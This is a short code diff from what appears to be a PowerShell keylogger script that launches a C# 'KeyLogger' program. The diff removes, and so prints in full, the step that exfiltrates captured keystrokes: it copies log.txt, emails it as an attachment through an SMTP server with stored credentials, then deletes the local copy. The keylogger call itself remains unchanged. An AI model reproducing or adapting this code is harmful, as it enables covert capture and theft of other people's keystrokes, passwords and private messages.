@@ -174,9 +174,4 @@ namespace KeyLogger {
 [KeyLogger.Program]::Main();	
 }
 
-copy-item -path "./log.txt" -destination D:/
-$AttachmentLog = "D:\log.txt"
-Send-MailMessage -From $From -to $To -Subject $Subject `
--Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
--Credential $credentials -Attachments $AttachmentLog
-Remove-Item D:\log.txt
+
